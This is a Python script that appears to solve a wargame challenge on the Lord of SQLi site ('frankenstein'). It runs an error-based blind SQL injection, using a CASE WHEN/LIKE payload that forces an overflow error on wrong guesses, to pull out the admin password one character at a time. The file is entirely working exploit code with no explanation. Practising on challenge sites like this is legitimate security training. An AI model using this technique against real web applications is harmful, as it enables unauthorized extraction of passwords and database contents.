import urllib.request
import sys

url = "https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?"
cookie = sys.argv[1]
pw = ''
letter = 'abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ'

while True:
  for j in letter:
    query = "pw=%27||id=%27admin%27%26%26case%20when%20pw%20like%20%27" + pw + j + "%%27%20then%201%20else%209e307*2%20end%23"
    req = urllib.request.Request(
      url+query,
      data=None,
      headers={
        "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Cookie" : cookie
      })
    with urllib.request.urlopen(req) as res:
      body = res.read().decode()
    if '?php' in body:
      pw += j
      break
  else:
    break
print(pw)
